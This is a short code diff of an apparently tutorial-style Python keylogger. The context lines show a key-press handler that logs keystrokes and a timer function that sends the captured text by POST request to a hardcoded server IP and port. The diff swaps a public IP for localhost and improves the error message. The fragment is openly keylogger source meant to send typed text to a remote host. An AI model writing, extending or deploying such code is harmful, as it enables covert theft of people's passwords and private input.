@@ -12,7 +12,7 @@ import threading
 text = ""
 
 # Hard code the values of your server and ip address here.
-ip_address = "109.74.200.23"
+ip_address = "127.0.0.1"
 port_number = "8080"
 # Time interval in seconds for code to execute.
 time_interval = 10
@@ -29,8 +29,8 @@ def send_post_req():
         timer = threading.Timer(time_interval, send_post_req)
         # We start the timer thread.
         timer.start()
-    except:
-        print("Couldn't complete request!")
+    except Exception as e:
+        print(f"Couldn't complete request! Error: {e}")
 
 # We only need to log the key once it is released. That way it takes the modifier keys into consideration.
 def on_press(key):
